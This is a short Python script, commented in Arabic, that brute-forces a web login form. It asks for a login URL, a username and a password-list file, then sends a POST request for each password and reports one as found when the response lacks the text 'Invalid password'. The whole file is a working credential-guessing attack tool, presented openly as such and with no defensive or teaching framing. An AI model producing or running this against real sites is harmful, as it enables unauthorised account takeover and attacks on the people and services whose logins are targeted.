import requests

# دالة لتجربة تسجيل الدخول باستخدام اسم مستخدم وكلمة مرور محددين
def try_password(url, username, password):
    payload = {
        "username": username,
        "password": password
    }
    
    # إرسال طلب POST لتسجيل الدخول
    response = requests.post(url, data=payload)
    
    # التحقق من نجاح تسجيل الدخول بناءً على محتوى الرد أو رمز الاستجابة
    if "Invalid password" not in response.text:  # عدل النص بناءً على الرد الفعلي للموقع
        print(f"Password found: {password}")
        return True
    return False

# دالة تجربة عدة كلمات مرور
def brute_force_attack(url, username, password_list):
    with open(password_list, "r") as file:
        for line in file:
            password = line.strip()
            print(f"Trying password: {password}")
            
            if try_password(url, username, password):
                print("Login successful!")
                break
        else:
            print("Password not found in the list.")

# جمع المعلومات من المستخدم
url = input("Enter the login URL: ")
username = input("Enter the username to test: ")
password_list = input("Enter the path to the password file: ")

# استدعاء دالة الهجوم
brute_force_attack(url, username, password_list)
